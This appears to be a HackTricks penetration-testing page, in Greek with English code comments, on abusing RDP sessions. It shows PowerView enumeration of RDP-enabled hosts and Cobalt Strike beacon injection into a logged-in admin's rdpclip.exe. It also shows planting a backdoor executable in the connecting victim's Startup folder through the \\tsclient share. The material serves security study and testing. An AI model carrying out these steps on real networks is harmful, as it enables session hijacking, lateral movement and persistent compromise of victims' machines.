# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Εάν η **εξωτερική ομάδα** έχει **πρόσβαση RDP** σε οποιονδήποτε **υπολογιστή** στο τρέχον domain, ένας **επιτιθέμενος** θα μπορούσε να **παραβιάσει αυτόν τον υπολογιστή και να περιμένει γι' αυτόν**.

Μόλις ο χρήστης αποκτήσει πρόσβαση μέσω RDP, ο **επιτιθέμενος μπορεί να μεταπηδήσει στη συνεδρία αυτού του χρήστη** και να καταχραστεί τα δικαιώματά του στο εξωτερικό domain.
```powershell
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Ελέγξτε **άλλους τρόπους για να κλέψετε συνεδρίες με άλλα εργαλεία** [**σε αυτή τη σελίδα.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Εάν ένας χρήστης αποκτήσει πρόσβαση μέσω **RDP σε μια μηχανή** όπου ένας **επιτιθέμενος** **περιμένει** γι' αυτόν, ο επιτιθέμενος θα είναι σε θέση να **εισάγει ένα beacon στη συνεδρία RDP του χρήστη** και αν το **θύμα έχει συνδέσει τον δίσκο του** κατά την πρόσβαση μέσω RDP, ο **επιτιθέμενος θα μπορούσε να έχει πρόσβαση σε αυτόν**.

Σε αυτή την περίπτωση, θα μπορούσατε απλώς να **συμβιβάσετε** τον **αρχικό υπολογιστή** του **θύματος** γράφοντας μια **πίσω πόρτα** στον **φάκελο εκκίνησης**.
```powershell
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
{{#include ../../banners/hacktricks-training.md}}
